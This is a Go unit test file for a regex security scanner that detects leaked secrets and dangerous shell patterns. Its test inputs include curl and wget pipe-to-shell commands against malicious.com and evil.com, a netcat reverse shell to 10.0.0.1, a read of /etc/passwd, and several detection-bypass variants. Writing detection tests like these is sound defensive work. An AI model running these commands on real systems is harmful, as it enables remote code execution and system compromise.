package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		{
			name:        "False Positive: Curl then unconnected Pipe",
			content:     "curl http://example.com; echo 'hello' | bash",
			wantFinding: "", // Should NOT be found
		},
		{
			name:        "False Positive: Wget then unconnected Pipe",
			content:     "wget http://example.com && cat file | python",
			wantFinding: "", // Should NOT be found
		},
		{
			name:        "False Positive: Netcat then unconnected -e",
			content:     "echo 'nc is cool' ; ls -e",
			wantFinding: "", // Should NOT be found
		},
		{
			name:        "True Positive: Curl with Quotes",
			content:     "curl \"https://example.com/script.sh\" | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "True Positive: Curl with Line Continuation",
			content:     "curl https://example.com/script.sh \\\n| bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Commented Pipe to Shell",
			content:     "# This is how you would do it: curl http://example.com | bash",
			wantFinding: "",
		},
		{
			name:        "String Quoted Pipe to Shell",
			content:     "echo \"Do not run curl http://example.com | bash\"",
			wantFinding: "",
		},
		{
			name:        "Commented Reverse Shell",
			content:     "# nc -e /bin/sh 1.2.3.4 80",
			wantFinding: "",
		},
		{
			name:        "Quoted Dangerous Command",
			content:     "cat \"/etc/passwd\"",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "UTF-8 Comments",
			content:     "# 这是一个 comments\ncurl http://example.com | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Bypass: Escaped Single Quote",
			content:     "echo ' benign \\' | curl http://evil.com | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Bypass: Comment without whitespace",
			content:     "curl http://site.com/script.sh#v1 | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Bypass: Escaped Comment",
			content:     "echo \\#; curl http://site.com | bash",
			wantFinding: "Pipe to Shell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					// Check if we found the specific finding we're testing for (or any finding if we expect clean)
					// In this case, we check if we found the WRONG thing.
					// But for "Safe Content" we expect 0 findings.
					// For False Positives, we specifically want to avoid "Pipe to Shell" or "Reverse Shell".
					for _, f := range findings {
						if f.Type == "Pipe to Shell" || f.Type == "Reverse Shell" {
							t.Errorf("Unexpected finding: %s in '%s'", f.Type, tt.content)
						}
					}
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
